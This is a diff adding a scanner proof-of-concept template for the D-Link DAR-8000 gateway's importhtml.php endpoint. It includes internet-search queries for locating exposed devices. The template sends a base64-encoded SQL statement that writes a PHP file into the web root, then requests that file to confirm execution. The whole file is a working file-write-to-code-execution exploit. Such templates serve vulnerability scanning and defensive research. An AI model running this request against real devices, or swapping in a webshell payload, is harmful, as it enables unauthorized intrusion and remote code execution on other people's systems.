@@ -1,0 +1,40 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: body="images/login_t.gif" && body="images/login_b.gif" || fid="X3opNnmW3l40ZdKuR+Ixfg=="
+    hunter-query: web.body="上网行为审计网关" or web.body="images/login_t.gif"
+    quake-query: app:"D-Link DAR-8000"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-D-Link-DAR-8000-importhtml-php-upload
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0ICI8P3BocCBwaHBpbmZvKCk/PiIgaW50byBvdXRmaWxlICcvdXNyL2hkZG9jcy9uc2cvYXBwL2luZm9kZW1vLnBocCc=
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencode
+      body: 
+    expression: >-
+      response.status == 200 && response.body_string.contains("<title>")
+  r1:
+    request:
+      method: GET
+      path: /app/infodemo.php
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("PHP Version")
+
+expression:  r0() && r1()
